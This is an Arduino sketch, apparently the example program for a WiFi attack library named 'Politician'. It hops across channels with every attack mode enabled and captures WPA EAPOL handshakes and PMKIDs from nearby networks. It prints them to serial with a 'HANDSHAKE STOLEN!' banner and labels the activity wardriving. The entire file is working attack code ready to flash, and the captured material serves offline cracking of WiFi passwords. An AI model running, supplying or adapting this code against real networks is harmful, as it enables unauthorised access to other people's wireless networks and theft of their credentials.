#include <Arduino.h>
#include <Politician.h>

using namespace politician;

Politician engine;

void onHandshake(const HandshakeRecord &rec) {
    Serial.println("\n[!] HANDSHAKE STOLEN!");
    Serial.printf("SSID: %s\n", rec.ssid);
    Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  rec.bssid[0], rec.bssid[1], rec.bssid[2],
                  rec.bssid[3], rec.bssid[4], rec.bssid[5]);
    
    if (rec.type == CAP_PMKID) {
        Serial.print("PMKID: ");
        for (int i = 0; i < 16; i++) Serial.printf("%02x", rec.pmkid[i]);
        Serial.println();
    } else {
        Serial.println("EAPOL M1+M2 captured.");
    }
}

void onApFound(const ApRecord &ap) { }

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n--- Politician Library Example ---");

    engine.setEapolCallback(onHandshake);
    engine.setApFoundCallback(onApFound);

    Config cfg;
    cfg.hop_dwell_ms = 250;
    
    if (engine.begin(cfg) != politician::OK) {
        Serial.println("WiFi Init Failed!");
        while(1) delay(100);
    }
    
    engine.startHopping();
    engine.setActive(true);
    engine.setAttackMask(ATTACK_ALL);

    Serial.println("Wardriving started...");
}

void loop() {
    engine.tick();

    static uint32_t lastStats = 0;
    if (millis() - lastStats > 10000) {
        lastStats = millis();
        Stats &st = engine.getStats();
        Serial.printf("[Stats] frames=%lu eapol=%lu pmkid=%lu total_caps=%lu \n",
                      st.total, st.eapol, st.pmkid_found, st.captures);
    }
}
